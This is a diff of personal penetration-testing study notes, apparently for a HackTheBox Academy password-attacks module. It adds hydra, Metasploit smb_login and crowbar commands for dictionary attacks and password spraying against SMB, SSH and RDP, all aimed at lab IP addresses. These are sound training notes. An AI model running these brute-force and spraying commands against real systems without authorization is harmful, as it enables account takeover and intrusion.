@@ -2,8 +2,7 @@
 
 https://academy.hackthebox.com/storage/resources/Password-Attacks.zip
 
-[[Pentest/services/SMB/SMB]] [[LDAP]] [[mssql]]
-##### SMB, LDAP, MSSQL, etc.
+##### [[Pentest/services/SMB/SMB|SMB]], [[LDAP]], [[mssql]], etc.
 https://github.com/byt3bl33d3r/CrackMapExec
 #CrackMapExec 
 ```shell
@@ -52,7 +51,11 @@ hydra -L user.list -P password.list ssh://10.129.42.197
 ```bash
 hydra -L user.list -P password.list 10.129.42.197 smb
 ```
-### Dictionary attack on SMB use msfconsole
+
+```bash
+hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
+```
+### Dictionary attack on [[SMB]] use [[metasploit]]
 ```shell
 msfconsole -q
 use auxiliary/scanner/smb/smb_login
@@ -65,3 +68,19 @@ set stop_on_success true
 set RHOST STMIP
 run
 ```
+
+### [[RDP]] Password Spraying
+https://github.com/galkan/crowbar
+Installation:
+```bash
+sudo apt install -y crowbar
+# or
+git clone https://github.com/galkan/crowbar
+cd crowbar/
+pip3 install -r requirements.txt
+```
+
+```bash
+crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+```
+
